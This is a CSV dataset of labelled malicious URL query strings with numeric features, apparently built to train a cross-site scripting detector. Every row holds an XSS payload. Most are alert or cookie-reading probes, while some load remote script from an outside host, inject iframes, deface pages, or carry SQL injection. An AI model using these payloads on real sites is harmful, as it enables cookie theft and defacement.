url,len,url_count,evil_char,evil_word,shang,label,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
"textsize=small&option=com_content&task=blogcategory&id=14&Itemid=46&catid=1>""><ScRiPt >alert(/xssed by RohitBansal/);</ScRiPt>",1.323826645,0,1.111111111,2,1.096482161,1,,,,,,,,
"q=""><iframe src=""http://xssed.com"">",-0.517718128,1,0.888888889,0.666666667,0.317975381,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
"p=1&term=""><script>alert(String.fromCharCode(88,83,83))</script>",0.069147789,0,1,1,0.824005333,1,,,,,,,,
"keywords=""><iframe src=""http://xssed.com"">",-0.376060837,1,0.888888889,0.666666667,0.448252622,1,,,,,,,,
"id=asdf""><script>alert(document.domain);</script><a b=""",-0.112983013,0,1,1.333333333,0.498994777,1,,,,,,,,
"mode=extensions&ext=<script>alert(String.fromCharCode(88,83, 83))</script>",0.271515346,0,0.777777778,1.333333333,0.809898234,1,,,,,,,,
"task=search&q=""><script>alert(/beyrut-kaI3uS/)</script>",-0.112983013,0,1,1,0.485384599,1,,,,,,,,
search=<script>alert(document.cookie)</script>,-0.295113814,0,0.555555556,1,0.100355836,1,,,,,,,,
s=<script>alert(document.cookie)</script>,-0.396297593,0,0.555555556,1,0.061149985,1,,,,,,,,
"tid=880&type=""><script>alert(String.fromCharCode(88,83,83))</script>",0.150094812,0,1,1,0.837675808,1,,,,,,,,
quicksearchquery=<script>alert('XSS')</script>&result=<script>alert('XSS')</script>,0.453646148,0,1.555555556,2,0.224913655,1,,,,,,,,
s=XSSED<script>alert(1337)</script>,-0.517718128,0,0.555555556,1,0.191100323,1,,,,,,,,
"method=text""<script>alert(document.cookie)</script>""&c=en_US&q=xxx",0.1096213,0,0.777777778,1,0.646851577,1,,,,,,,,
q=<script>alert('XSS')</script>,-0.598665151,0,0.777777778,1,-0.115840756,1,,,,,,,,
"recommendPage=""><script>alert('XSS');</script>",-0.295113814,0,1,1,0.507174966,1,,,,,,,,
"switch=offer&cmd=&pid=&phrase=""><script>alert('xss');</script>",0.028674277,0,1,1,0.394652589,1,,,,,,,,
f=88&d=4039&url=http://google.com,-0.558191639,1,0.222222222,0,0.305322628,1,,,,,,,,
"ratetype=0&order=&start=0&firstname=""><script>alert(document.cookie)</script>&firstnameS=4&lastname=Smith&lastnameS=4&subject=Science&subjectS=4&school=&schoolS=4&state=all",2.254717409,0,0.777777778,1,0.501713372,1,,,,,,,,
"keyword=&fname="">--><script>alert(document.cookie)</script>&lname=&state=CA",0.291752102,0,0.888888889,1,0.7089875,1,,,,,,,,
"page_id=223""><script>alert(document.cookie)</script>",-0.17369328,0,0.777777778,1,0.521969724,1,,,,,,,,
"page_id=14""><script>alert(document.cookie)</script>",-0.193930036,0,0.777777778,1,0.502937,1,,,,,,,,
"keyword=\""><script>alert(document.cookie)</script>",-0.214166791,0,0.777777778,1,0.403774679,1,,,,,,,,
"page_id=13""><script>alert(document.cookie)</script>",-0.193930036,0,0.777777778,1,0.502937,1,,,,,,,,
"page_id=7""><script>alert(document.cookie)</script>",-0.214166791,0,0.777777778,1,0.419578637,1,,,,,,,,
"id=88""><script>alert(document.cookie)</script>",-0.295113814,0,0.777777778,1,0.270473626,1,,,,,,,,
msg=<script>alert(document.cookie);</script>,-0.335587326,0,0.555555556,1,0.274803059,1,,,,,,,,
"email=XSS""><script >alert(1234); </script>",-0.376060837,0,0.777777778,1.666666667,0.496038518,1,,,,,,,,
"id=""><ScRiPt>alert(/..::arSh::../)</ScRiPt>",-0.355824082,0,1,1,0.030694195,1,,,,,,,,
"q=""><script>alert(document.cookie);</script>&city=ns&=Pretra�i",0.028674277,0,0.777777778,1,0.551315331,1,,,,,,,,
"searchQuery='""></title><script>alert(1337)</script>",-0.193930036,0,1.222222222,1,0.211551926,1,,,,,,,,
"keyword=xss""><script>alert(document.cookie)</script>",-0.17369328,0,0.777777778,1,0.382780637,1,,,,,,,,
"searchtext='""></title><script>alert(1337)</script>",-0.214166791,0,1.222222222,1,-0.020520283,1,,,,,,,,
"s=""><script>alert(""XSS'd By Tom"")</script>",-0.376060837,0,1.111111111,1.666666667,0.543824414,1,,,,,,,,
"pubid=""><script src=http://www.planetcreator.net/attacking/xss/planetcreator-xss.js></script>>",0.676250461,1,1.444444444,1.333333333,0.380170497,1,,,,,,,,
method=doListSoftware&id=1&flay=find&softwareName=<iframe+src=http://www.google.com></iframe>,0.656013705,1,0.777777778,0.333333333,0.643068004,1,,,,,,,,
"terms=""><script>alert(1)</script>",-0.558191639,0,0.777777778,1,-0.378517408,1,,,,,,,,
"page=""><iframe src=http://xssed.com></iframe><script>alert(document.cookie);/*",0.352462369,1,1.333333333,1.333333333,0.711394187,1,,,,,,,,
"gid=137""><script>alert(""xssed by prashant"")</script>",-0.17369328,0,1,1.666666667,0.510669997,1,,,,,,,,
"category=""><iframe src=""google.co.kr""width=400 height=400>",-0.052272746,0,0.666666667,1,0.39477412,1,,,,,,,,
"k=22e342dc6a6a99267a46f18fc5dcecf1&ab_s=18f5d31e3e39e9d3c8d5b850e79d4848&u=""><img src=\000 onerror=alert(/yehg.net/)>&&ab_c=103ffd7e-1ec7-b12d-d12a5ee2a828&r=",1.971402829,0,0.666666667,1.666666667,1.231279782,1,,,,,,,,
aff=1100&skin=&keywords=<script>alert(document.cookie)</script>,0.048911033,0,0.555555556,1,0.67186929,1,,,,,,,,
p=sb_merchandise_search&pdsearchcat=shopping&keywords=<script>alert(document.cookie)</script>&imageField.x=8&imageField.y=10,1.283353133,0,0.555555556,1,0.798257495,1,,,,,,,,
ReportType=34&qf=ryan&qn=wadsworth'><script>alert(document.cookie)</script>&qc=&qs=&qz=,0.534593171,0,0.777777778,1,0.875684593,1,,,,,,,,
naam=</TITLE><script>alert(1)</script>,-0.45700786,0,0.888888889,1,0.166556945,1,,,,,,,,
q=<script>alert('XSS')</script>,-0.598665151,0,0.777777778,1,-0.115840756,1,,,,,,,,
"role=Admin""><script>alert(document.cookie)</script>",-0.193930036,0,0.777777778,1,0.25845352,1,,,,,,,,
j_username=<script>alert(document.cookie)</script>,-0.214166791,0,0.555555556,1,0.26307027,1,,,,,,,,
"suche=<script>alert(String.fromCharCode(88, 83, 83,101,100,32,98,121,32,71,52,77,77,52))</script>",0.736960728,0,2,1.666666667,0.94314646,1,,,,,,,,
"keywords=""><Script>alert(document.cookie)</Script>&x=5&y=15",-0.03203599,0,0.777777778,1,0.787499007,1,,,,,,,,
"aff=112&keywords=""><script>alert(document.cookie)</script>",-0.052272746,0,0.777777778,1,0.714648361,1,,,,,,,,
"terms=asd&SUName=""><script>alert(document.cookie)</script>",-0.052272746,0,0.777777778,1,0.472054553,1,,,,,,,,
"s=1111""></iframe><script>alert(String.fromCharCode(88,83,83,32,98,121,32,104,51,120,83,116,114,101,97,109))</script><a href=&submit=Search",1.566667714,0,2.888888889,1.333333333,1.071329286,1,,,,,,,,
"utm_source=""><script>alert(""xss"");</script>",-0.355824082,0,1,1,0.026950613,1,,,,,,,,
"id=>""><iframe src=""http://xssed.com"">",-0.477244616,1,1,0.666666667,0.216430225,1,,,,,,,,
"search=go&l=25&d1=180+days+ago&d2=today&s=relevance&q=--><img+src=""logo_.png""+onerror=""alert(document.cookie)""+f=&Submit=Go",1.263116378,0,0.666666667,1,1.088332879,1,,,,,,,,
drpField1=&txtSearch1=<script>alert('XSS');</script>&drpPhrase1=and&drpField2=[TI]&txtSearch2=<script>alert('XSS');</script>&drpPhrase2=and&drpField3=[AU]&txtSearch3=<script>alert('XSS');</script>&drpPhrase3=and&drpField4=[TA]&txtSearch4=<script>alert('XSS');</script>&drpPhrase4=exact&chkBMCJournals=true&drpFromDate=&drpToDate=&chkCurrentOpinion=true&drpAddedInLast=&drpOrderBy=by+date&drpPerPage=20&drpAbstract=no+abstract&Search.x=34&Search.y=4&Search=Search&strTempString=&strSearchBoxType=bmc_advanced_results&Search.x=10&jou_id=,9.600659743,0,3.111111111,4,1.303978622,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
"SearchString=""><script>alert(document.cookie)</script>&Input=Search",0.129858056,0,0.777777778,1,0.48471701,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
"&EMAIL=XSS""><script>alert(document.cookie)</script>",-0.193930036,0,0.777777778,1,0.858350612,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
"search=<iframe src=""http://xssed.com"">",-0.45700786,1,0.666666667,0.666666667,0.145762263,1,,,,,,,,
"id=""><script>alert(/AH-Crew/)</script>  ",-0.416534349,0,1,1.666666667,0.230943664,1,,,,,,,,
"tt=news&newsID=163""><script src=http://www.planetcreator.net/attacking/xss/planetcreator-xss.js></script>>",0.91909153,1,1.444444444,1.333333333,0.478599561,1,,,,,,,,
"lang=ar&m=options&act=ministry_inthe_media&cat=33&page=""><script>alert(""True Promise Team - Sec-krb.com"")</script>",1.080985576,0,1,2.333333333,0.877216812,1,,,,,,,,
"page=5&cat=""><script src=http://www.planetcreator.net/attacking/xss/planetcreator-xss.js></script>>",0.77743424,1,1.444444444,1.333333333,0.298308687,1,,,,,,,,
"zoek=zoek&fullTextSearch=""><script>alert+('Killer-TR')</script>&text_autocomplete_regio=plaats&postcode=&straal=10&zoek=zoek",1.283353133,0,1,1,0.785581691,1,,,,,,,,
page=single&url=<script>alert('NanoyMaster_waz_ere');</script>&useragent=2&typeProtocol=11,0.595303438,0,0.777777778,1,0.661011196,1,,,,,,,,
r=rechtliches&text=<script>alert(1)</script>,-0.335587326,0,0.555555556,1,-0.342658809,1,,,,,,,,
"pg=&cat=&searchand=&searchfraze=""><script>alert(/AH-Crew  The Best  Fuck Serbia/)</script>&searchor=&searchbt.x=0&searchbt.y=0",1.323826645,0,1,3,0.858529781,1,,,,,,,,
"page=<script>alert(String.fromCharCode(88, 83, 83, 32, 102, 111, 117, 110, 100, 32, 98, 121, 32, 84, 105, 109, 115, 101))</script>",1.404773668,0,2.444444444,6.666666667,0.43553493,1,,,,,,,,
search=<script>alert(123)</script>&searchBtn=Search,-0.193930036,0,0.555555556,1,0.033436904,1,,,,,,,,
"go=1&option=com_seotools&tool=9&url=""><script>alert('NanoyMaster_waz_ere');</script>&dcrange=0&imageverify=NAR74&timehsh=47696b7a576c303d&submit=Check",1.809508783,0,1,1,1.477369116,1,,,,,,,,
"q=""><script>alert('xss');</script>",-0.537954883,0,1,1,-0.104232053,1,,,,,,,,
"id=1484""><script>alert(document.cookie)</script>",-0.254640303,0,0.777777778,1,0.446857535,1,,,,,,,,
"search_key=""><script src=http://www.planetcreator.net/attacking/xss/planetcreator-xss.js></script>>&btn_search=SEARCH",1.141695843,1,1.444444444,1.333333333,0.727296072,1,,,,,,,,
"k=xss""><script>alert(document.cookie)</script>&submit=",-0.133219768,0,0.777777778,1,0.404593078,1,,,,,,,,
Catalogo=<script>alert(document.cookie)</script>,-0.254640303,0,0.555555556,1,0.204423755,1,,,,,,,,
q=<script>alert(/XSS DEVEK/)</script>,-0.477244616,0,0.777777778,1.333333333,0.303560422,1,,,,,,,,
"redirectUrl="";}alert('XSS by Kakia - kakia.baywords.org');</script>",0.129858056,0,0.666666667,2,0.899539743,1,,,,,,,,
"err=</script><script>alert('XSS by Kakia - kakia.baywords.org');""></script>",0.291752102,0,1.333333333,2.666666667,0.726110945,1,,,,,,,,
"route=list/search&q=""><scriptsrc=http://www.planetcreator.net/attacking/xss/planetcreator-xss.js></script>>&t=1",1.020275309,1,1.555555556,1,0.338966097,1,,,,,,,,
"q=""/><script>alert(/xss/)</script>&x=0&y=0",-0.376060837,0,1.111111111,1,0.035493187,1,,,,,,,,
cause_num=</title><script>alert('XSS by Kakia - kakia.baywords.org');</script>,0.352462369,0,1.111111111,2.333333333,0.995241743,1,,,,,,,,
"query=""><script src=http://www.planetcreator.net/attacking/xss/planetcreator-xss.js></script>>&hitsPerPage=10&lang=mm&hitsPerPage=10&lang=mm",1.607141225,1,1.444444444,1.333333333,0.777640793,1,,,,,,,,
"page_id=20&sub_page_id=85""><script>alert(document.cookie)</script>",0.1096213,0,0.777777778,1,0.806383373,1,,,,,,,,
page=<script>alert(1)</script>,-0.618901906,0,0.555555556,1,-0.384328585,1,,,,,,,,
"Message2=<script>alert(""hello"")</script>",-0.416534349,0,0.777777778,1,0.019577608,1,,,,,,,,
"searchbox=<SCRIPT>alert(""Xacked"");</SCRIPT><SCRIPT>alert(""XSS PWN"");</SCRIPT><SCRIPT>alert(""sh3n.net"");</SCRIPT><script>function do_main(){document.body.innerHTML = ""Xacked by sh3n"";}do_main();return_result(result_id, ""Site defaced"");</script><script>return_result(result_id, clipboardData.getData(""sh3n""));</script><SCRIPT>alert(""Xacked by sh3n"");</SCRIPT><script>function do_main(){return_result(result_id, ""i pwn you"");window.location = ""www.sh3n.net"";}do_main();</script>",8.386454399,0,6.222222222,11.66666667,1.621400047,1,,,,,,,,
"query='><script>alert(""sh3n.net"")</script>&&&&&&&&&",-0.193930036,0,1,1,0.130793515,1,,,,,,,,
"fnode=MTY1NDA0Ng&mco=MTgwNTgyOTUttt""><script>alert(document.cookie)</script>",0.311988858,0,0.777777778,1,1.203770792,1,,,,,,,,
"extrasekce=movies""><script>alert('XSS')</script>&jazyk=cz&limitmimo=19   <- warez site",0.514356415,0,1.111111111,2.666666667,0.834542915,1,,,,,,,,
"actn=quicksearch&searchtype=all&wildcardType=none&keyword='"";alert(document.cookie);//&x=0&y=0",0.676250461,0,0.444444444,0.333333333,0.711549625,1,,,,,,,,
"search='""><script>alert(document.cookie)</script><!--&x=0&y=0&search_category_id=&search_by_tags=1&search_by_text=1",1.101222332,0,1,1,0.83211897,1,,,,,,,,
"id=0""><script>alert('XSS')</script>",-0.517718128,0,1,1,0.064225266,1,,,,,,,,
index=D:\WebSite\search\&stemming=&maxFiles=25&autoStopLimit=5000&sort=Hits&cmd=search&SearchForm=%%SearchForm%%&request=<script>alert(document.cookie)</script>,2.01187634,0,0.555555556,1,0.964733053,1,,,,,,,,
"page=petition""><script>alert('XSS')</script>",-0.335587326,0,1,1,0.051338833,1,,,,,,,,
jsessionid=7DEF02DF774F69367A7025DE8B6849FAquery=<script>alert(document.cookie)</script>&partner=0&collection=0&cid=16028    XSS Script andInsertion,1.769035271,0,0.555555556,3.333333333,1.4808383,1,,,,,,,,
"Special=0""><script>alert('XSS')</script>&Gemstone=&Color=&Cut=&ct=&Type=&HighPrice=&LowPrice=&num=&ID=amGSlj-17&numback=&JewelryType=",1.465483935,0,1,1,1.232839609,1,,,,,,,,
"page=7&totRec=4473""><script>alert(document.cookie)</script>&stype=",0.1096213,0,0.777777778,1,0.609978555,1,,,,,,,,
"act=cpage&id='""></script><iframe/src=http://site.mynet.com/serhat_man/index.php><h1>Hack",0.554829927,1,1.666666667,0.666666667,0.597541235,1,,,,,,,,
"showheader=n&game=&id=&wave=&about=&drop=&show=1""><script>alert(document.cookie)</script>&contactsent",0.817907751,0,0.777777778,1,0.533019114,1,,,,,,,,
"act=cpage&id==""><script>alert('HeRo')</script><h1>Hacked By HeRo/h1>",0.150094812,0,1.444444444,1.666666667,0.729482154,1,,,,,,,,
"act=cpage&id==""><script>alert('HeRo')</script><h1>Hacked By HeRo/h1>",0.150094812,0,1.444444444,1.666666667,0.729482154,1,,,,,,,,
"act=cpage&id==""><script>alert('HeRo')</script><h1>Hacked By HeRo/h1>",0.150094812,0,1.444444444,1.666666667,0.729482154,1,,,,,,,,
"distance=50&Search=""><img+src=http://img257.imageshack.us/img257/3733/77822687.png><""&find=Search",0.736960728,1,1.222222222,0.333333333,1.038551318,1,,,,,,,,
"FID=""><script>alert('XSS HACKED || BYMURATHOCA')</script>",-0.072509501,0,1,2,1.332506505,1,,,,,,,,
"FID=""><script>alert('XSS HACKED || BY MURATHOCA')</script>",-0.052272746,0,1,2.333333333,1.305082512,1,,,,,,,,
"FID=""><script>alert('HACKED BY MURATHOCA || ATATURKUN PICLERINE KARSI')</script>",0.392935881,0,1,3,1.298439239,1,,,,,,,,
"FID=""><script>alert('HACKED BY MURATHOCA || MURNETHACK.COM')</script>",0.170331568,0,1,2.333333333,1.301097653,1,,,,,,,,
"FID=""><script>alert('HACKED BY MURATHOCA || ATATURKUN PICLERINE KARSI')</script>",0.392935881,0,1,3,1.298439239,1,,,,,,,,
"FID=""><script>alert('HACKED BY MURATHOCA || ATATURKUN PICLERINE KARSI')</script>",0.392935881,0,1,3,1.298439239,1,,,,,,,,
"value=/""><script>alert('Xss ByAtm0n3r')</script>&submit_search=",0.048911033,0,1.111111111,1.333333333,0.85113097,1,,,,,,,,
"oc=dndob28&c=us&l=en&s=dhs&cs=19&model_id=inspiron-15-intel-n5040?oc=i14aw32-a&mboxEnv=XSS', '560', '400');alert('By @DiSiqueira_');//",1.485720691,0,1.222222222,1.333333333,1.664131029,1,,,,,,,,
"id=5 union select 1,CHAR(60, 115, 99, 114, 105, 112,116, 62, 97, 108, 101, 114, 116, 40, 39, 67, 121, 98, 101, 114, 66, 101, 108, 108, 111, 110, 97, 46,111, 114, 103, 39, 41, 60, 47,115, 99, 114, 105, 112, 116,62),3 from information_schema.tables--",3.792710845,0,4.777777778,14,-0.319043039,1,,,,,,,,
"banner_id=""><script>alert(document.cookie)</script>",-0.193930036,0,0.777777778,1,0.337159701,1,,,,,,,,
"qsrc=4032&o=102542&l=dir&shoppingPgType=search&viewType=grid&q='""><ScRipT>alert(document.cookie)</scRipT>",0.898854774,0,0.888888889,1.333333333,1.319962705,1,,,,,,,,
"query='""><ScRipT>alert(document.cookie)</scRipT>&bool=and&type=keyword",0.190568323,0,0.888888889,1,0.915783944,1,,,,,,,,
"query='""><ScRipT>alert (document.cookie)</scRipT>&filters[top_level_category]=",0.352462369,0,0.888888889,1.333333333,1.076170861,1,,,,,,,,
"key='""><ScRipT>alert(document.cookie)</scRipT>",-0.295113814,0,0.888888889,1,0.647340936,1,,,,,,,,
"aff=1109&skin=&keywords='""><ScRipT>alert(document.cookie)</scRipT>&catId=Category&address=83704&maxDistance=&submit=Search",1.242879622,0,0.888888889,1,1.392999074,1,,,,,,,,
"q=<MARQUEE+BEHAVIOR=ALTERNATE+DIRECTION=""up"">+a+strong+weapon+against+criminality.</MARQUEE><object+type=application/x-shockwave-flash+data=http://www.woweb.ru/fl0/94.swf+width=700+height=350><param+name=movie+value=http://www.xml.com/2002/01/23/svg/cubes.swf></object><iframe+src+=http://www.youtube.com/watch?v=x5ws5GALu-E""+width=""0""+height=""0""+\></div>&cauta=Search",6.221121535,1,4.333333333,0,1.956849442,1,,,,,,,,
"dimension=2&faction=Clan&guild=Peoples+Republic+of+Rubi-ka&guild=""><script>alert('NanoyMaster_Waz_ere');</script>&dimension=2&faction=Clan",1.566667714,0,1,1,1.114390415,1,,,,,,,,
"Search=<object type=""application/x-shockwave-flash"" data=""http://dl.dropbox.com/u/1926037/neave_imagination.swf"" width=""600"" height=""500""><param name=""movie"" value=""http://dl.dropbox.com/u/1926037/neave_imagination.swf""></object>",3.408212486,1,3.333333333,2,1.37440735,1,,,,,,,,
"searchstring=""><script>alert(document.cookie)</script>&content=search",0.170331568,0,0.777777778,1,0.187537495,1,,,,,,,,
uid=f1e27f7794e2a9850957ad5adea90cbe&n=<script>alert(/Zack @ InSecurity.ro/)</script>,0.49411966,0,0.777777778,1.666666667,1.233122116,1,,,,,,,,
